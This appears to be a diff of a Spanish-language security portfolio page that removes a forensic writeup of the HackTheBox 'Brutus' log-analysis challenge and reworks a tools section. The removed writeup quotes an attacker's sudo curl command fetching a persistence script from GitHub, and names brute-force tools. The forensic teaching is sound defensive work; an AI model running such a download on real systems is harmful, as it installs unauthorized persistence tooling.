@@ -154,7 +154,7 @@
           <div id="tab-htb" class="tab-content active">
             <div class="machines-grid">
               <!-- Machine Card Example -->
-              <div class="machine-card" onclick="showWriteup('brutus')">
+              <div class="machine-card" style="cursor: default;">
                 <div class="machine-header">
                   <h4>Brutus</h4>
                   <span class="difficulty very-easy">Very Easy</span>
@@ -167,8 +167,7 @@
                   <span><i class="fab fa-linux"></i> Linux</span>
                   <span><i class="fas fa-calendar-alt"></i> 2025</span>
                 </div>
-                <button class="machine-action" onclick="showWriteup('brutus'); event.stopPropagation();">Leer
-                  Writeup</button>
+                <button class="machine-action" style="opacity: 0.5; cursor: not-allowed;">Próximamente</button>
               </div>
 
               <div class="machine-card">
@@ -216,355 +215,7 @@
         </div>
 
         <!-- Writeup View: Brutus -->
-        <div id="writeup-brutus" class="writeup-container hidden">
-          <button class="back-button" onclick="closeWriteup()">
-            <i class="fas fa-arrow-left"></i> Volver a Writeups
-          </button>
 
-          <div class="writeup-content">
-            <div class="writeup-header">
-              <img src="./assets/brutus-banner.png" alt="Brutus Header" class="writeup-hero-img">
-              <h1>Informe (Writeup) de Brutus</h1>
-              <div class="writeup-meta">
-                <span><strong>Preparado por:</strong> Ph0eNyx</span>
-                <span><strong>Autor:</strong> Cyberjunkie</span>
-                <span><strong>Dificultad:</strong> Muy Fácil</span>
-              </div>
-            </div>
-
-            <div class="writeup-body">
-              <h3>Escenario</h3>
-              <p><strong>Artefactos proporcionados:</strong></p>
-              <ul>
-                <li>1-Brutus.zip (archivo zip), sha256: dd7742375a19b6ccc4323058224460a5220c43d4e9f7565b653bd369b8c46b2d
-                </li>
-              </ul>
-
-              <h3>Habilidades Adquiridas</h3>
-              <ul>
-                <li>Análisis de Logs de Unix</li>
-                <li>Análisis de wtmp</li>
-                <li>Análisis de actividad de Fuerza Bruta (BruteForce)</li>
-                <li>Creación de Línea de Tiempo</li>
-                <li>Análisis Contextual</li>
-                <li>Análisis Post-Explotación</li>
-              </ul>
-
-              <h3>Etiquetas</h3>
-              <div class="tags">
-                <span class="tech-badge">Forense en Linux</span>
-                <span class="tech-badge">DFIR</span>
-              </div>
-
-              <hr>
-
-              <h3>Análisis Inicial</h3>
-              <p>Se nos han proporcionado dos artefactos: los logs de autenticación de Linux (<code>auth.log</code>) y
-                la salida de <code>WTMP</code>. Comencemos con una breve explicación de qué son estos archivos de log,
-                para qué se utilizan y los campos e información que contienen.</p>
-
-              <h4>auth.log</h4>
-              <p>En este desafío "Sherlock" muy fácil, te familiarizarás con los logs de Unix <code>auth.log</code> y
-                <code>wtmp</code>. Exploraremos un escenario donde un servidor <strong>Confluence</strong> fue atacado
-                por fuerza bruta a través de su servicio <strong>SSH</strong>. Después de obtener acceso al servidor, el
-                atacante realizó actividades adicionales, las cuales podemos rastrear usando <code>auth.log</code>.
-                Aunque <code>auth.log</code> se utiliza principalmente para el análisis de fuerza bruta, profundizaremos
-                en todo el potencial de este artefacto en nuestra investigación, incluyendo aspectos de escalada de
-                privilegios, persistencia, e incluso cierta visibilidad en la ejecución de comandos.
-              </p>
-              <p>El archivo <code>auth.log</code> se utiliza principalmente para rastrear mecanismos de autenticación.
-                Cada vez que un usuario intenta iniciar sesión, cambiar de usuario o realizar cualquier tarea que
-                requiera autenticación, se realiza una entrada en este archivo de log. Esto incluye actividades que
-                involucran a <code>sshd</code> (demonio SSH), acciones de <code>sudo</code> y tareas <code>cron</code>
-                que requieren autenticación.</p>
-
-              <p><strong>Campos en auth.log</strong></p>
-              <p>Las entradas en auth.log típicamente incluyen los siguientes campos:</p>
-              <ul>
-                <li><strong>Fecha y Hora:</strong> El sello de tiempo (<em>timestamp</em>) de cuándo ocurrió el evento.
-                </li>
-                <li><strong>Nombre de Host:</strong> El nombre del sistema en el que ocurrió el evento.</li>
-                <li><strong>Servicio:</strong> El nombre del demonio o servicio que informa el evento, como
-                  <code>sshd</code> para el demonio SSH.
-                </li>
-                <li><strong>PID:</strong> El ID de Proceso (PID) del servicio cuando se registró el evento.</li>
-                <li><strong>Usuario:</strong> El nombre de usuario involucrado en el proceso de autenticación.</li>
-                <li><strong>Estado de Autenticación:</strong> Detalla si el intento de autenticación fue exitoso o
-                  fallido.</li>
-                <li><strong>Dirección IP/Nombre de Host:</strong> Para conexiones remotas, la dirección IP o nombre de
-                  host del cliente que intenta conectarse.</li>
-                <li><strong>Mensaje:</strong> Un mensaje detallado sobre el evento, incluidos mensajes de error o
-                  códigos específicos asociados con el intento de autenticación.</li>
-              </ul>
-
-              <p>A continuación, se detalla un ejemplo de entrada:</p>
-              <pre><code>Mar 10 10:23:45 exampleserver sshd[19360]: Failed password for invalid
-user admin from 192.168.1.101 port 22 ssh2</code></pre>
-              <p>La entrada anterior muestra un intento de contraseña fallido para un usuario llamado "admin" en
-                <code>exampleserver</code> desde una IP de origen de <code>192.168.1.101</code> a través del puerto 22
-                (SSH).
-              </p>
-
-              <h4>wtmp</h4>
-              <p>El archivo <code>wtmp</code> registra todos los eventos de inicio y cierre de sesión en el sistema. Es
-                un archivo binario, ubicado típicamente en <code>/var/log/wtmp</code>. El comando <code>last</code> se
-                puede usar para leer este archivo, proporcionando un historial de inicios y cierres de sesión de
-                usuarios, reinicios del sistema y cambios de nivel de ejecución (<em>runlevel</em>).</p>
-
-              <p><strong>Campos en wtmp</strong></p>
-              <p>Dado que wtmp es un archivo binario, no se puede leer directamente como auth.log. Sin embargo, cuando
-                se visualiza a través de utilidades como last, se presenta la siguiente información:</p>
-              <ul>
-                <li><strong>Nombre de Usuario:</strong> El nombre del usuario que inicia o cierra sesión.</li>
-                <li><strong>Terminal:</strong> El nombre del terminal o dispositivo tty. Los inicios de sesión remotos
-                  típicamente muestran los detalles de la conexión SSH o telnet.</li>
-                <li><strong>Dirección IP/Nombre de Host:</strong> Para inicios de sesión remotos, la dirección IP o
-                  nombre de host de la máquina del usuario.</li>
-                <li><strong>Hora de Inicio de Sesión:</strong> La fecha y hora en que el usuario inició sesión.</li>
-                <li><strong>Hora de Cierre de Sesión:</strong> La fecha y hora en que el usuario cerró sesión o se cerró
-                  la sesión.</li>
-                <li><strong>Duración:</strong> La duración de la sesión.</li>
-              </ul>
-
-              <p>Vea a continuación un ejemplo de la salida del comando 'last':</p>
-              <pre><code>sebh24 pts/0 192.168.1.100 Sat Mar 10 10:23 - 10:25
-(00:02)</code></pre>
-              <p>Esto indica que el usuario <code>sebh24</code> inició sesión desde <code>192.168.6.100</code> y la
-                sesión duró un total de 2 minutos.</p>
-              <p>Es importante darse cuenta de que cuando la arquitectura de la CPU del sistema del investigador forense
-                difiere de la arquitectura del sistema del que se tomó el archivo <code>wtmp</code>, puede haber
-                problemas al usar herramientas incorporadas como <code>last</code> o <code>utmpdump</code>. Por esta
-                razón, hemos proporcionado una herramienta llamada <strong>utmp.py</strong> para ayudar en la
-                investigación.</p>
-              <p>Los pasos para utilizar la herramienta son los siguientes:</p>
-              <pre><code>python3 utmp.py -o wtmp.out wtmp</code></pre>
-              <p>Esto nos proporciona un archivo <code>wtmp.out</code> legible por humanos que podemos abrir con
-                herramientas como <code>cat</code> o <code>less</code>.</p>
-
-              <h5>Comprensión de la Salida de utmp.py</h5>
-              <p>La salida de utmp.py incluye varios campos decodificados del formato binario del archivo wtmp. Aquí hay
-                una breve descripción general de los campos clave en la salida:</p>
-              <ul>
-                <li><strong>Type (Tipo):</strong> Indica el tipo de registro, como un inicio o cierre de sesión de
-                  usuario, arranque del sistema o evento de apagado.</li>
-                <li><strong>PID:</strong> El ID de Proceso relacionado con el evento.</li>
-                <li><strong>Line (Línea):</strong> La línea de terminal (tty o pts) en la que el usuario ha iniciado
-                  sesión.</li>
-                <li><strong>ID:</strong> Un identificador corto relacionado con el campo de línea.</li>
-                <li><strong>User (Usuario):</strong> El nombre de usuario asociado con el evento.</li>
-                <li><strong>Host:</strong> El nombre de host o la dirección IP desde donde el usuario está accediendo al
-                  sistema, si corresponde.</li>
-                <li><strong>Exit (Salida):</strong> El estado de salida de una sesión o un proceso.</li>
-                <li><strong>sec (segundo):</strong> El sello de tiempo (<em>timestamp</em>) del evento.
-                  <strong>Nota:</strong> Este sello de tiempo se presentará utilizando la zona horaria de su sistema y
-                  no la zona horaria del sistema del que se tomó el <code>wtmp</code>. Deberá tener esto en cuenta al
-                  investigar una línea de tiempo de incidentes.
-                </li>
-                <li><strong>usec (microsegundos):</strong> El componente de microsegundos del sello de tiempo asociado
-                  con un evento de inicio o cierre de sesión.</li>
-                <li><strong>Addr (Dirección):</strong> Información de dirección adicional, que podría ser la dirección
-                  IP en el caso de inicios de sesión remotos.</li>
-              </ul>
-
-              <p>Tanto <code>auth.log</code> como <code>WTMP</code> son vitales para los administradores de sistemas y
-                profesionales de seguridad para monitorear y auditar intentos de autenticación, actividades de usuarios
-                y patrones de acceso al sistema. Ayudan a identificar intentos de acceso no autorizados, garantizar el
-                cumplimiento de las políticas de seguridad e investigar incidentes de seguridad.</p>
-              <p>Muy bien, ahora que entendemos más sobre los artefactos proporcionados, profundicemos en el
-                <code>auth.log</code> para nuestro análisis. Abrimos nuestro <code>auth.log</code> en nuestro editor de
-                texto favorito y nos preparamos para responder las preguntas proporcionadas.
-              </p>
-
-              <hr>
-
-              <h3>Preguntas y Respuestas</h3>
-
-              <div class="qa-block">
-                <h4>1. Analice el <code>auth.log</code>. ¿Cuál es la dirección IP utilizada por el atacante para llevar
-                  a cabo un ataque de fuerza bruta?</h4>
-                <p>Para detectar un ataque de fuerza bruta en el <code>auth.log</code>, busque ocurrencias repetidas de
-                  las entradas "Invalid user" (Usuario inválido) y "Failed password" (Contraseña fallida) dentro de un
-                  corto período. Estas entradas indican intentos fallidos de inicio de sesión, a menudo con nombres de
-                  usuario o contraseñas incorrectas.</p>
-                <p>En los logs proporcionados hay numerosos intentos desde una única dirección IP,
-                  <strong><code>65.2.161.68</code></strong>, lo que indica un ataque de fuerza bruta. Preste especial
-                  atención a los sellos de tiempo, todos cayendo dentro de segundos. Una buena regla general al buscar
-                  ataques de fuerza bruta es considerar: "¿Podría un humano intentar autenticarse con tanta frecuencia
-                  manualmente?". Si la respuesta es no, sugerimos una investigación adicional.
-                </p>
-                <div class="answer-box">
-                  <strong>Respuesta:</strong> <code>65.2.161.68</code>
-                </div>
-              </div>
-
-              <div class="qa-block">
-                <h4>2. Los intentos de fuerza bruta fueron exitosos y el atacante obtuvo acceso a una cuenta en el
-                  servidor. ¿Cuál es el nombre de usuario de la cuenta?</h4>
-                <p>Hemos confirmado la dirección IP que realiza un ataque de fuerza bruta, sin embargo, necesitamos
-                  comprender si el Actor de Amenaza (TA) tuvo éxito. Después de un ataque de fuerza bruta exitoso, la
-                  palabra clave <strong>"Accepted password"</strong> (Contraseña aceptada) significa un inicio de sesión
-                  exitoso.</p>
-                <p>En la imagen anterior (no incluida, pero descrita), podemos confirmar la autenticación exitosa de la
-                  cuenta <strong><code>root</code></strong> como parte del mismo ataque de fuerza bruta, lo que indica
-                  que han comprometido al usuario con más privilegios en el sistema. En el mismo segundo, también vemos
-                  que la sesión se cierra, lo que indica aún más el uso de una herramienta de fuerza bruta.</p>
-                <p>Una herramienta de fuerza bruta es un programa o script de software diseñado para intentar
-                  sistemáticamente todas las combinaciones posibles de caracteres o valores para encontrar una solución
-                  correcta, típicamente utilizada en el contexto de la rotura de contraseñas o criptografía. La fuerza
-                  bruta es un método exhaustivo donde se prueba cada opción posible hasta que se encuentra la correcta.
-                </p>
-                <p>Algunos ejemplos de herramientas de fuerza bruta para la autenticación se detallan a continuación:
-                </p>
-                <ul>
-                  <li>Hydra</li>
-                  <li>Medusa</li>
-                  <li>Brutus</li>
-                </ul>
-                <div class="answer-box">
-                  <strong>Respuesta:</strong> <code>root</code>
-                </div>
-              </div>
-
-              <div class="qa-block">
-                <h4>3. Identifique el sello de tiempo UTC cuando el atacante inició sesión manualmente en el servidor y
-                  estableció una sesión de terminal para llevar a cabo sus objetivos. La hora de inicio de sesión será
-                  diferente a la hora de autenticación y se puede encontrar en el artefacto <code>wtmp</code>.</h4>
-                <p>El atacante utilizó inicialmente herramientas automatizadas para el ataque de fuerza bruta. Sin
-                  embargo, al adquirir las credenciales correctas, se autenticaron manualmente. Podemos confirmar esto
-                  dentro del archivo <code>auth.log</code> como se detalla a continuación:</p>
-
-                <table class="writeup-table">
-                  <thead>
-                    <tr>
-                      <th>auth.log</th>
-                      <th>WTMP</th>
-                    </tr>
-                  </thead>
-                  <tbody>
-                    <tr>
-                      <td>El <code>auth.log</code>, en el contexto de iniciar sesión en un host, rastrea específicamente
-                        los eventos de autenticación.</td>
-                      <td>Las entradas en el <code>WTMP</code> registran la creación y destrucción de terminales, o la
-                        asignación y liberación de terminales a usuarios. En este contexto, podemos rastrear la sesión
-                        interactiva creada por el Actor de Amenaza (TA) con precisión dentro del <code>WTMP</code>.</td>
-                    </tr>
-                  </tbody>
-                </table>
-
-                <p>Confirmamos que el TA se autenticó a las <code>06:32:44</code> con la cuenta <code>root</code>, sin
-                  embargo, para este análisis específico, utilizaremos el artefacto <code>WTMP</code>, ya que este nos
-                  proporcionará la hora en que el atacante tuvo un terminal interactivo conectado, y no solo cuando se
-                  aceptó la contraseña. Antes de continuar, vea a continuación una breve explicación de la discrepancia
-                  de tiempo entre los artefactos <code>WTMP</code> y <code>auth.log</code>.</p>
-                <p>Revisando la salida de <code>wtmp</code> podemos confirmar la apertura exitosa de una sesión de
-                  terminal interactiva por parte del TA a las <strong><code>06:32:45</code></strong>.</p>
-                <p>Como se describió anteriormente, este sello de tiempo se presentará utilizando la zona horaria de
-                  nuestro sistema. Podemos verificar esto ejecutando el comando <code>date</code>. (El comando
-                  <code>date</code> mostró que la zona horaria del sistema era UTC).
-                </p>
-                <p>Como la zona horaria de nuestro sistema es UTC, no necesitamos ajustarla y podemos confirmar que esta
-                  es nuestra respuesta.</p>
-                <div class="answer-box">
-                  <strong>Respuesta:</strong> <code>2024-03-06 06:32:45</code>
-                </div>
-              </div>
-
-              <div class="qa-block">
-                <h4>4. Las sesiones de inicio de sesión SSH son rastreadas y se les asigna un número de sesión al
-                  iniciar la sesión. ¿Cuál es el número de sesión del atacante para la cuenta de usuario de la Pregunta
-                  2?</h4>
-                <p>A cada sesión de inicio de sesión SSH se le asigna un número de sesión único para el seguimiento, que
-                  se puede ver dentro del archivo <code>auth.log</code> y se puede encontrar mirando la línea de log
-                  inmediatamente después de la línea de log de "session opened" (sesión abierta).</p>
-                <p>Según los logs de autenticación, el número de sesión asignado al inicio de sesión del atacante
-                  (utilizando la cuenta <code>root</code> comprometida) fue <strong><code>37</code></strong>.</p>
-                <div class="answer-box">
-                  <strong>Respuesta:</strong> <code>37</code>
-                </div>
-              </div>
-
-              <div class="qa-block">
-                <h4>5. El atacante agregó un nuevo usuario como parte de su estrategia de persistencia en el servidor y
-                  le dio a esta nueva cuenta de usuario privilegios más altos. ¿Cuál es el nombre de esta cuenta?</h4>
-                <p>Los atacantes a menudo crean nuevas cuentas de usuario para la persistencia. La persistencia, en este
-                  contexto, se refiere a la capacidad de un atacante para mantener el acceso o control sobre un sistema
-                  o red comprometidos durante un período prolongado, incluso después de que se haya logrado el acceso
-                  inicial. Esencialmente, se trata de garantizar un acceso no autorizado continuo al entorno objetivo.
-                </p>
-                <p>Agregar un nuevo usuario es una forma efectiva de mantener la persistencia y se puede completar sin
-                  necesidad de herramientas adicionales, básicamente "viviendo de la tierra" (<em>living off the
-                    land</em>). Dentro del <code>auth.log</code> busque las siguientes palabras clave:</p>
-                <ul>
-                  <li><code>useradd</code> - Indica que se ha agregado un usuario al sistema.</li>
-                  <li><code>usermod</code> - Indica la modificación de permisos o grupos de usuarios.</li>
-                  <li><code>groupadd</code> - Indica la creación de un nuevo grupo de usuarios.</li>
-                </ul>
-                <p>Los logs muestran la creación de un nuevo usuario llamado <strong><code>cyberjunkie</code></strong>,
-                  quien posteriormente fue agregado al grupo <code>sudo</code> para privilegios elevados.</p>
-                <p>En los sistemas Linux, el grupo <code>sudo</code> es un grupo especial que otorga a los usuarios la
-                  capacidad de ejecutar comandos con privilegios administrativos, también conocidos como privilegios de
-                  superusuario o <em>root</em>. El término "sudo" significa "superusuario hacer" (<em>superuser
-                    do</em>).</p>
-                <p>Para otorgar privilegios <code>sudo</code> a un usuario, un administrador debe agregar al usuario al
-                  grupo <code>sudo</code>. Esto se puede hacer modificando los archivos de configuración de gestión de
-                  usuarios del sistema o utilizando el comando <code>usermod</code> con las opciones apropiadas.</p>
-                <p>Una vez que un usuario es agregado al grupo <code>sudo</code>, puede ejecutar comandos con
-                  privilegios elevados anteponiendo <code>sudo</code> al comando.</p>
-                <div class="answer-box">
-                  <strong>Respuesta:</strong> <code>cyberjunkie</code>
-                </div>
-              </div>
-
-              <div class="qa-block">
-                <h4>6. ¿Cuál es el ID de la sub-técnica MITRE ATT&CK utilizada para la persistencia mediante la creación
-                  de una nueva cuenta?</h4>
-                <p>Entendemos que se creó una nueva cuenta de usuario como método para lograr la persistencia y que la
-                  cuenta era una cuenta local en el host comprometido. Ahora necesitamos traducir esto a un ID de
-                  técnica utilizando el <em>framework</em> <strong>MITRE ATT&CK</strong>. El <em>framework</em> MITRE
-                  ATT&CK clasifica varias tácticas y técnicas utilizadas por los atacantes. Podemos utilizar la Matriz
-                  Empresarial y localizar bajo "Persistencia" la técnica "Crear Cuenta" (<em>Create Account</em>),
-                  detallada como <strong>T1136</strong>.</p>
-                <p>Profundicemos un poco más en esta técnica, observando las sub-técnicas. Las sub-técnicas nos permiten
-                  desglosar los ataques de manera más granular. Por ejemplo, hay numerosos tipos de cuentas que podrían
-                  crearse; en la captura de pantalla (no incluida) podemos ver Dominio, Local y Nube (<em>Cloud</em>).
-                  En la investigación actual, sabemos que fue una cuenta local, por lo tanto, la sub-técnica es
-                  <strong>T1136.001</strong>.
-                </p>
-                <div class="answer-box">
-                  <strong>Respuesta:</strong> <code>T1136.001</code>
-                </div>
-              </div>
-
-              <div class="qa-block">
-                <h4>7. ¿A qué hora finalizó la primera sesión SSH del atacante según <code>auth.log</code>?</h4>
-                <p>En la pregunta 4 descubrimos que el ID de la sesión era 37. Podemos confirmar en el
-                  <code>auth.log</code> que la sesión 37 se cerró a las <strong><code>06:37:24</code></strong>.
-                </p>
-                <div class="answer-box">
-                  <strong>Respuesta:</strong> <code>2024-03-06 06:37:24</code>
-                </div>
-              </div>
-
-              <div class="qa-block">
-                <h4>8. El atacante inició sesión en su cuenta de <em>backdoor</em> y utilizó sus privilegios más altos
-                  para descargar un <em>script</em>. ¿Cuál es el comando completo ejecutado usando <code>sudo</code>?
-                </h4>
-                <p>Aunque <code>auth.log</code> no se utiliza principalmente para rastrear la ejecución de comandos, los
-                  comandos ejecutados con <code>sudo</code> se registran ya que requieren autenticación.</p>
-                <p>Los logs revelan que el atacante ejecutó un comando para descargar un <em>script</em> desde un
-                  repositorio de GitHub usando <code>sudo</code>. El comando completo fue:
-                  <strong><code>/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</code></strong>.
-                  Esta acción indica la intención del atacante de desplegar herramientas o <em>malware</em> adicionales
-                  para una mayor explotación o persistencia.
-                </p>
-                <div class="answer-box">
-                  <strong>Respuesta:</strong>
-                  <code>/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</code>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
 
         <!-- Detail: About -->
         <div id="detail-about" class="detail-section hidden">
@@ -655,45 +306,126 @@ user admin from 192.168.1.101 port 22 ssh2</code></pre>
           <h2 class="detail-title">Arsenal Técnico & Herramientas</h2>
 
           <!-- Featured Repo -->
-          <div class="featured-repo">
+          <!-- Featured Repo: Blue Shield Toolkit -->
+          <div class="featured-repo clickable" onclick="toggleRepoDetails('blue-shield')">
             <div class="repo-header">
               <h3><i class="fab fa-github"></i> Blue Shield Toolkit</h3>
               <span class="repo-tag">Public Release</span>
             </div>
             <p>Repositorio central de scripts y configuraciones para hardening y defensa activa.</p>
-            <a href="https://github.com/Ph0e-Nyx/Blue-Shield-Toolkit-Defensivo-de-Ciberseguridad" target="_blank"
-              class="repo-link">
-              Acceder al Repositorio <i class="fas fa-external-link-alt"></i>
-            </a>
+            <div class="repo-actions">
+              <span class="expand-hint"><i class="fas fa-chevron-down"></i> Ver Detalles</span>
+              <a href="https://github.com/Ph0e-Nyx/Blue-Shield-Toolkit-Defensivo-de-Ciberseguridad" target="_blank"
+                class="repo-link" onclick="event.stopPropagation()">
+                Acceder al Repositorio <i class="fas fa-external-link-alt"></i>
+              </a>
+            </div>
           </div>
 
-          <div class="tech-grid-full">
-            <div class="tech-category">
-              <h3>SIEM & Log Management</h3>
-              <ul>
-                <li>Splunk Enterprise Security</li>
-                <li>Elastic Stack (ELK)</li>
-                <li>Wazuh XDR</li>
-                <li>Graylog</li>
-              </ul>
+          <!-- Details: Blue Shield Toolkit -->
+          <div id="repo-blue-shield" class="repo-details hidden">
+            <div class="tech-grid-full">
+              <div class="tech-category">
+                <h3>SIEM & Log Management</h3>
+                <ul>
+                  <li>Splunk Enterprise Security</li>
+                  <li>Elastic Stack (ELK)</li>
+                  <li>Wazuh XDR</li>
+                  <li>Graylog</li>
+                </ul>
+              </div>
+              <div class="tech-category">
+                <h3>Infrastructure & Cloud</h3>
+                <ul>
+                  <li>Docker & Kubernetes Security</li>
+                  <li>AWS Security Hub</li>
+                  <li>Linux Hardening (CIS Benchmarks)</li>
+                  <li>Bash & Python Scripting</li>
+                </ul>
+              </div>
             </div>
-            <div class="tech-category">
-              <h3>Forensics & Analysis</h3>
-              <ul>
-                <li>Autopsy Digital Forensics</li>
-                <li>Volatility Framework</li>
-                <li>Wireshark / TShark</li>
-                <li>Velociraptor</li>
-              </ul>
+          </div>
+
+          <!-- Featured Repo: Forense Digital -->
+          <div class="featured-repo clickable" onclick="toggleRepoDetails('forense')">
+            <div class="repo-header">
+              <h3><i class="fas fa-search"></i> Forense Digital</h3>
+              <span class="repo-tag">New Release</span>
             </div>
-            <div class="tech-category">
-              <h3>Infrastructure & Cloud</h3>
-              <ul>
-                <li>Docker & Kubernetes Security</li>
-                <li>AWS Security Hub</li>
-                <li>Linux Hardening (CIS Benchmarks)</li>
-                <li>Bash & Python Scripting</li>
-              </ul>
+            <p>Herramientas y recursos especializados para el análisis forense digital y respuesta a incidentes.</p>
+            <div class="repo-actions">
+              <span class="expand-hint"><i class="fas fa-chevron-down"></i> Ver Detalles</span>
+              <a href="https://github.com/Ph0e-Nyx/forense-digital" target="_blank" class="repo-link"
+                onclick="event.stopPropagation()">
+                Acceder al Repositorio <i class="fas fa-external-link-alt"></i>
+              </a>
+            </div>
+          </div>
+
+          <!-- Details: Forense Digital -->
+          <div id="repo-forense" class="repo-details hidden">
+            <div class="tech-grid-full">
+              <div class="tech-category">
+                <h3>Forensics & Analysis</h3>
+                <ul>
+                  <li>Autopsy Digital Forensics</li>
+                  <li>Volatility Framework</li>
+                  <li>Wireshark / TShark</li>
+                  <li>Velociraptor</li>
+                  <li>FTK Imager</li>
+                  <li>Eric Zimmerman's Tools</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+
+          <!-- Featured Repo: HollowSec Community -->
+          <div class="featured-repo clickable" onclick="toggleRepoDetails('hollowsec')">
+            <div class="repo-header">
+              <h3><i class="fab fa-discord"></i> HollowSec Community</h3>
+              <span class="repo-tag">Active Community</span>
+            </div>
+            <p>Comunidad de ciberseguridad enfocada en Red Team, Blue Team y Purple Team. Aprende, comparte y colabora
+              con profesionales.</p>
+            <div class="repo-actions">
+              <span class="expand-hint"><i class="fas fa-chevron-down"></i> Ver Detalles</span>
+              <a href="https://discord.gg/hollowsec" target="_blank" class="repo-link"
+                onclick="event.stopPropagation()">
+                Unirse al Discord <i class="fab fa-discord"></i>
+              </a>
+            </div>
+          </div>
+
+          <!-- Details: HollowSec Community -->
+          <div id="repo-hollowsec" class="repo-details hidden">
+            <div class="tech-grid-full">
+              <div class="tech-category">
+                <h3>Red Team</h3>
+                <ul>
+                  <li>Pentesting & Ethical Hacking</li>
+                  <li>Exploit Development</li>
+                  <li>Social Engineering</li>
+                  <li>Red Team Operations</li>
+                </ul>
+              </div>
+              <div class="tech-category">
+                <h3>Blue Team</h3>
+                <ul>
+                  <li>Threat Detection & Hunting</li>
+                  <li>Incident Response</li>
+                  <li>Security Monitoring (SIEM)</li>
+                  <li>Defensive Security</li>
+                </ul>
+              </div>
+              <div class="tech-category">
+                <h3>Purple Team</h3>
+                <ul>
+                  <li>Security Assessment</li>
+                  <li>Vulnerability Management</li>
+                  <li>Threat Intelligence</li>
+                  <li>Collaborative Defense</li>
+                </ul>
+              </div>
             </div>
           </div>
         </div>
